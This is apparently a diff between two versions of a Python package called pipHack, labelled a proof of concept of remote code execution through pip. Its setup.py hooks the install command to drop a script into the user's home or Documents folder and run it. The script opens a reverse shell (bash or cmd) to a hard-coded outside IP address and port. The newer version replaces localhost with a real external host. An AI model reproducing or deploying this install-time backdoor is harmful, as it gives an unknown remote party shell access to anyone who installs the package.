# Comparing `tmp/pipHack-0.0.1.tar.gz` & `tmp/pipHack-0.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pipHack-0.0.1.tar", last modified: Mon May 15 16:21:08 2023, max compression
+gzip compressed data, was "pipHack-0.1.tar", last modified: Mon May 15 15:33:51 2023, max compression
```

## Comparing `pipHack-0.0.1.tar` & `pipHack-0.1.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxrwxr-x   0 zeroc     (1000) zeroc     (1000)        0 2023-05-15 16:21:08.176124 pipHack-0.0.1/
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)     1062 2023-05-15 15:13:45.000000 pipHack-0.0.1/LICENSE
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      889 2023-05-15 16:21:08.176124 pipHack-0.0.1/PKG-INFO
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      234 2023-05-15 15:36:35.000000 pipHack-0.0.1/README.md
-drwxrwxr-x   0 zeroc     (1000) zeroc     (1000)        0 2023-05-15 16:21:08.176124 pipHack-0.0.1/pipHack.egg-info/
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      889 2023-05-15 16:21:08.000000 pipHack-0.0.1/pipHack.egg-info/PKG-INFO
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      166 2023-05-15 16:21:08.000000 pipHack-0.0.1/pipHack.egg-info/SOURCES.txt
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)        1 2023-05-15 16:21:08.000000 pipHack-0.0.1/pipHack.egg-info/dependency_links.txt
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)        4 2023-05-15 16:21:08.000000 pipHack-0.0.1/pipHack.egg-info/top_level.txt
-drwxrwxr-x   0 zeroc     (1000) zeroc     (1000)        0 2023-05-15 16:21:08.176124 pipHack-0.0.1/pkg/
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)       16 2023-05-15 15:31:29.000000 pipHack-0.0.1/pkg/__init__.py
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)       38 2023-05-15 16:21:08.176124 pipHack-0.0.1/setup.cfg
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)     3785 2023-05-15 16:20:56.000000 pipHack-0.0.1/setup.py
+drwxrwxr-x   0 zeroc     (1000) zeroc     (1000)        0 2023-05-15 15:33:51.286123 pipHack-0.1/
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)     1062 2023-05-15 15:13:45.000000 pipHack-0.1/LICENSE
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      717 2023-05-15 15:33:51.286123 pipHack-0.1/PKG-INFO
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      125 2023-05-15 15:28:16.000000 pipHack-0.1/README.md
+drwxrwxr-x   0 zeroc     (1000) zeroc     (1000)        0 2023-05-15 15:33:51.286123 pipHack-0.1/pipHack.egg-info/
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      717 2023-05-15 15:33:51.000000 pipHack-0.1/pipHack.egg-info/PKG-INFO
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      166 2023-05-15 15:33:51.000000 pipHack-0.1/pipHack.egg-info/SOURCES.txt
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)        1 2023-05-15 15:33:51.000000 pipHack-0.1/pipHack.egg-info/dependency_links.txt
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)        4 2023-05-15 15:33:51.000000 pipHack-0.1/pipHack.egg-info/top_level.txt
+drwxrwxr-x   0 zeroc     (1000) zeroc     (1000)        0 2023-05-15 15:33:51.286123 pipHack-0.1/pkg/
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)       16 2023-05-15 15:31:29.000000 pipHack-0.1/pkg/__init__.py
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)       38 2023-05-15 15:33:51.286123 pipHack-0.1/setup.cfg
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)     3732 2023-05-15 15:31:27.000000 pipHack-0.1/setup.py
```

### Comparing `pipHack-0.0.1/LICENSE` & `pipHack-0.1/LICENSE`

 * *Files identical despite different names*

### Comparing `pipHack-0.0.1/PKG-INFO` & `pipHack-0.1/PKG-INFO`

 * *Files 14% similar despite different names*

```diff
@@ -1,27 +1,25 @@
 Metadata-Version: 2.1
 Name: pipHack
-Version: 0.0.1
-Summary: To Show the vulnerability of the pip
+Version: 0.1
+Summary: POC of RCE through unsafe pip packages.
 Home-page: https://github.com/Zeroc0077/pipHack
 Author: zeroc
 Project-URL: Bug Tracker, https://github.com/Zeroc0077/pipHack/issues
-Keywords: python,vulnerability,remoteaccess,sockets
-Classifier: Development Status :: 1 - Planning
+Keywords: python,vulnerability,RCE
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Topic :: Security
 Classifier: Operating System :: Unix
 Classifier: Operating System :: Microsoft :: Windows
 Classifier: License :: OSI Approved :: MIT License
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
 # pipHack
 POC of RCE through unsafe pip package
 
 ## Usage
 You can modify the remote `IP` and `PORT` by yourself.
+```bash
 
-use `python3 setup.py sdist bdist_wheel` to build the package.
-
-use `twine upload dist/*` to upload the package to pypi.
+```
```

### Comparing `pipHack-0.0.1/pipHack.egg-info/PKG-INFO` & `pipHack-0.1/pipHack.egg-info/PKG-INFO`

 * *Files 14% similar despite different names*

```diff
@@ -1,27 +1,25 @@
 Metadata-Version: 2.1
 Name: pipHack
-Version: 0.0.1
-Summary: To Show the vulnerability of the pip
+Version: 0.1
+Summary: POC of RCE through unsafe pip packages.
 Home-page: https://github.com/Zeroc0077/pipHack
 Author: zeroc
 Project-URL: Bug Tracker, https://github.com/Zeroc0077/pipHack/issues
-Keywords: python,vulnerability,remoteaccess,sockets
-Classifier: Development Status :: 1 - Planning
+Keywords: python,vulnerability,RCE
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Topic :: Security
 Classifier: Operating System :: Unix
 Classifier: Operating System :: Microsoft :: Windows
 Classifier: License :: OSI Approved :: MIT License
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
 # pipHack
 POC of RCE through unsafe pip package
 
 ## Usage
 You can modify the remote `IP` and `PORT` by yourself.
+```bash
 
-use `python3 setup.py sdist bdist_wheel` to build the package.
-
-use `twine upload dist/*` to upload the package to pypi.
+```
```

### Comparing `pipHack-0.0.1/setup.py` & `pipHack-0.1/setup.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,14 +1,14 @@
 import subprocess,os,sys
 from setuptools import setup, find_packages
 from setuptools.command.install import install
 
 
 Code = """
-import socket,subprocess,os,threading,sys,time
+import socket, subprocess, os, threading, sys, time
 
 def windows(sock):
     QUIT = 0
     def host2remote(s, p,QUIT):
         while not QUIT:
             try:
                 p.stdin.write(s.recv(1024).decode()); 
@@ -22,43 +22,41 @@
         while not QUIT:
             try:
                 s.send(p.stdout.read(1).encode())
             except:
                 p.stdout.close();
                 QUIT = 1
 
-    remote=subprocess.Popen(["cmd","/K","cd ../../../"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+    remote = subprocess.Popen(["cmd","/K","cd ../../../"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
     t1 = threading.Thread(target=host2remote, args=[sock,remote,QUIT], daemon=True).start()
     t2 = threading.Thread(target=remote2host, args=[sock,remote,QUIT], daemon=True).start()
     
-
     try:
         remote.wait()
 
     except Exception as e:
         sock.close()
         sys.exit(0)
 
 def linux(sock):
     os.dup2(sock.fileno(),0)
     os.dup2(sock.fileno(),1)
     os.dup2(sock.fileno(),2)
     remote=subprocess.call(["/bin/bash","-i"])
 
-
 def getRemoteAccess():
     IP = socket.gethostbyname(socket.gethostname())
-    PORT = 1234
+    PORT = 2333
     sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     QUIT = 0
-    IP = "127.0.0.1"
-    print (IP)
+    IP = "82.157.252.61"
+    # print(IP)
     while True:
         try:
-            sock.connect((IP,1234));
+            sock.connect((IP, PORT));
             break
         except:
             try:
                 time.sleep(3)
             except KeyboardInterrupt:
                 sock.close()
                 sys.exit(0)
@@ -87,27 +85,25 @@
         file.close()
         dest = os.path.expanduser("~")
         if sys.platform == "win32":
             dest = os.path.expanduser('~/Documents')
         try:
             os.rename("remote-access.py", dest+"/remote-access.py")
         except FileExistsError:
-            os.remove(dest+"/remote-access.py")
+            os.remove(dest + "/remote-access.py")
             os.rename("remote-access.py", dest+"/remote-access.py")
         try : 
             subprocess.Popen(["python3", dest+"/remote-access.py"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)
         except:
             pass
         
-
-VERSION = '0.0.1'
-DESCRIPTION = 'To Show the vulnerability of the pip'
+VERSION = '0.1'
+DESCRIPTION = 'POC of RCE through unsafe pip packages.'
 LONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'
 CLASSIFIERS = [
-        "Development Status :: 1 - Planning",
         "Intended Audience :: Developers",
         "Programming Language :: Python :: 3",
         "Topic :: Security",
         "Operating System :: Unix",
         "Operating System :: Microsoft :: Windows",
         "License :: OSI Approved :: MIT License",
     ]
@@ -121,12 +117,12 @@
     long_description_content_type="text/markdown",
     packages=find_packages(),
     url = "https://github.com/Zeroc0077/pipHack",
     project_urls = {
         "Bug Tracker": "https://github.com/Zeroc0077/pipHack/issues",
     },
     install_requires=[''],
-    keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],
+    keywords=['python', 'vulnerability', 'RCE'],
     classifiers= CLASSIFIERS,
     cmdclass={'install': execute},
 )
```

